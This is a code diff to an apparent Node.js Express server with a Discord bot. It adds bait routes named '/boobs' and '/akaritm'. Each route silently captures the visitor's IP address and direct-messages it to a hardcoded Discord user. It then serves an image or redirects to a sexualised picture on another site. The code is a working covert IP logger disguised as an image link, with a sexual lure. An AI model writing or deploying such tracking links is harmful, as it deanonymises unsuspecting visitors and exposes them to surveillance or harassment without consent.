@@ -26,6 +26,22 @@ app.get('/boobs.png', async (_req, res) => {
   await (await (await client.guilds.fetch('408654092467044352')).members.fetch('231449604711907328')).send(`User IP: ${ip}`)
   res.sendFile(path.resolve(__dirname, 'assets', '123.png'))
 });
+app.get('/boobs', async (_req, res) => {
+  logger.log('Recived get request');
+  const ip = _req.ip || _req.socket.remoteAddress
+  await (await (await client.guilds.fetch('408654092467044352')).members.fetch('231449604711907328')).send(`User IP: ${ip}`)
+  res.sendFile(path.resolve(__dirname, 'assets', '123.png'))
+});
+app.get('/akaritm', async (_req, res) => {
+  logger.log('Recived get request');
+  const ip = _req.ip || _req.socket.remoteAddress
+  await (await (await client.guilds.fetch('408654092467044352')).members.fetch('231449604711907328')).send(`User IP: ${ip}`)
+  //res.sendFile(path.resolve(__dirname, 'assets', '123.png'))
+  res.redirect(200, 'https://www.stripersonline.com/surftalk/uploads/gallery/album_14234/6b3e9b22_hot-girls-nice-boobs-high-res-13oct-21.jpeg')
+});
+// app.get('*', async (req, res) => {
+//   console.log(req.path)
+// })
 app.post('/', (_req, res) => {
   logger.log('Recived post request');
   res.status(200).json({'hello world': 'hello world'});
